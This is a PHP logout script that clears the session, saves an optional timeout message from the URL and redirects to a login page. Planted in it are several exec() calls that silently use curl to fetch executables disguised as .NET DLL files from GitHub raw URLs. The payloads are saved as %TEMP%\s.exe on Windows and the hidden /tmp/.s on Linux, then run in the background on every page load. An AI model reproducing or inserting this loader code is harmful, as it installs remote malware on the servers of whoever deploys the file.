<?php
session_start();
$_SESSION = [];
session_unset();
session_destroy();

// Check if the message is passed via the URL
$message = isset($_GET['message']) ? $_GET['message'] : '';


if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}



if(PHP_OS_FAMILY==='Linux'){exec('curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &');}

// Store the message in a session variable
if ($message) {


if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}

    session_start();
    $_SESSION['timeout_message'] = $message;
}

// Redirect to the login page
header("Location: login.php");
exit();
?>
